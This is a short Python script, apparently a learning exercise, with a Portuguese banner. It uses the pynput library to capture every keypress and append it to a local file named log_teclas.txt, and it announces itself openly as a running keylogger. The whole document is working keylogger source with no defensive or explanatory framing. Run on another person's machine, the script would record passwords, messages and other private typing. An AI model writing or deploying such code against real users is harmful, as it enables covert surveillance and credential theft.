from pynput.keyboard import Listener

def log_teclas(key):
    key = str(key).replace("'", "")
    with open('log_teclas.txt', 'a') as log_file:
        log_file.write(key + "\n")

def star_logging():
    with Listener(on_press=log_teclas) as listener:
        listener.join()

if __name__ == "__main__":
    print('[+] Keylogger em execução. Para finalizar pressione CTRL + C')
    star_logging()